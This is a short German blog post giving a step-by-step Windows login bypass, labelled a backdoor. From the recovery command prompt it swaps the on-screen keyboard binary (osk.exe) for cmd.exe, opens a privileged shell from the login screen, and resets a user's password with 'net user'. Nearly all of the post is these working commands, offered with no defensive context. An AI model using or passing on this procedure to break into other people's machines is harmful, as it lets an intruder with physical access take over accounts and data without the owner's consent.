---
layout:     post
title:      Windows Login umgehen (backdoor)

date:       2021-05-01
author:     user

summary:    Windows Login umgehen (backdoor)
categories: Login
thumbnail:  cogs
tags:
            - Windows
            - Login
            - Passwort
            - umgehen
            - backdoor
            - Hintertür
---

## Windows Login umgehen (backdoor)

Was wir brauchen:

1. Original Image von Windows (.iso)
2. Bootable USB


Vorgehensweise:

1. Von Windows-USB-Stick booten
2. Computerreparaturoptionen
    ![Thumper](https://i.imgur.com/cgOS11f.jpg) 
3. Problembehandlung
    ![Thumper](https://i.imgur.com/XZsOGe0.jpg)
4. Eingabeaufforderung
    ![Thumper](https://i.imgur.com/MdtXTKA.jpg)
5. Auf C-Platte wechseln
```
C:
```
6. Dann in den Windows Ordner
```
cd Windows\System32
```
7. osk = on screen keyboard (Bildschirmtastatur)
```
dir osk.exe
```
8. Original umbenennen
```
rename osk.exe osk.orig.exe
```
9. cmd.exe zu osk.exe kopieren
```
copy cmd.exe osk.exe
```
10. überprüfen
```
dir osk*
```
10. PC neustartem
11. Erleichterte Bedienung > Bildschirmtastatur - Es wird allerdings cmd.exe gestartet weil wir diese ja zuvor ausgetauscht haben
12. net user *USERNAME* *NEUES PW*
```
net user eski 1234
```
13. Einloggen
